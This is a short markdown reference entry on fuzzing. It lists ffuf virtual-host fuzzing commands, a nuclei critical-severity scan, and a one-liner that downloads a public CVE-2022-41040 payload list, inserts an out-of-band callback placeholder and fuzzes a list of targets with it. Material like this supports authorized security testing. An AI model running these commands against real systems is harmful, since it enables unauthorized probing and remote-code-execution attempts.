---
title: "Fuzzing"
summary: "fuzzing tools and commands."
status: "reviewed"
last_reviewed: "2026-06-06"
tags:
  - tools
  - fuzzing
related: []
references: []
---
# Fuzzing

### ffuf -c -w /path/to/wordlist -u http://ffuf.io.fi -H "host: FUZZ.ffuf.io.fi" -fs

- Type: `command`
- Kind: `snippet`
- Bug class: `recon;xss`
- Tier: `tier_2_useful`
- Value: ffuf -c -w /path/to/wordlist -u http://ffuf.io.fi -H "host: FUZZ.ffuf.io.fi" -fs 612

### nuclei -l urls-his -c 200 -t fuzzing-templates -s critical,high

- Type: `command`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_2_useful`
- Value: nuclei -l urls-his -c 200 -t fuzzing-templates -s critical,high

### cve 2022 41040 unfurl payloads.txt|sed

- Type: `tool`
- Kind: `url`
- Bug class: `rce;recon`
- Tier: `tier_2_useful`
- Value: https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed

### 1. ffuf -c -u https://target .com -H “Host: FUZZ” -w vhost_wordlist.txt

- Type: `command`
- Kind: `snippet`
- Bug class: `recon;xss`
- Tier: `tier_5_placeholder_payload`
- Value: 1. ffuf -c -u https://target .com -H “Host: FUZZ” -w vhost_wordlist.txt

### for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8

- Type: `payload`
- Kind: `snippet`
- Bug class: `rce;recon`
- Tier: `tier_5_placeholder_payload`
- Value: for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed ‘s/COLLABHERE/<OOB-PAYLOAD>/g’); do cat targets.txt |unfurl format $url >> fuzz-ready.txt;done & ffuf -w fuzz-ready.txt -u FUZZ

### target

- Type: `tool`
- Kind: `url`
- Bug class: `recon;xss`
- Tier: `tier_5_placeholder_payload`
- Value: https://target
